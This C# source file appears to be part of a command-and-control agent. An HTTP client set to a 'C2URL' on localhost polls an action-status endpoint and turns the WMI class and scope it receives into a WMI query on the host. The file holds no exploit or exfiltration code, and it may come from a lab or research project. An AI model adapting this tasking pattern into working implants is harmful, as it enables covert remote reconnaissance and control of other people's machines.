﻿using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Threading.Tasks;
using Newtonsoft.Json;

namespace WMInteraction
{
    class HTTPClient
    {
        public static string C2URL = "http://localhost:8090/";

        static HttpClient client = new HttpClient();
        private string ipAddress;
        private string username;
        private string os;
        private string uri;
        private Status clientStatus;

        public HTTPClient(string ipAddress, string username, string os, string uri)
        {
            this.ipAddress = ipAddress;
            this.username = username;
            this.os = os;
            this.uri = "/api/clients/1234/action_status";
        }

        public string Uri
        {
            get { return uri; }
            set { uri = value; }
        }

        public Status ClientStatus
        {
            get { return clientStatus; }
            set { clientStatus = value; }
        }

        static async Task<string> GetStatusAsync(string path)
        {
            string status = null;
            HttpResponseMessage response = await client.GetAsync(path);
            if (response.IsSuccessStatusCode)
            {
                status = await response.Content.ReadAsStringAsync();
            }
            return status;
        }

        public static async Task RunAsync(WMI_component wmi_component)
        {
            client.BaseAddress = new Uri(C2URL);
            client.DefaultRequestHeaders.Accept.Clear();
            client.DefaultRequestHeaders.Accept.Add(
                new MediaTypeWithQualityHeaderValue("application/json"));

            try
            {
                string jsonStatus = await GetStatusAsync("/api/clients/1234/action_status");
                dynamic DynamicData = JsonConvert.DeserializeObject(jsonStatus);
                wmi_component.WmiAttributes = "*";
                wmi_component.WmiClass = DynamicData[0]["wmi_class"];
                wmi_component.Scope = DynamicData[0]["wmi_scope"];
                wmi_component.Query = new Query(wmi_component.Scope, wmi_component.WmiAttributes, wmi_component.WmiClass);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
    }
}
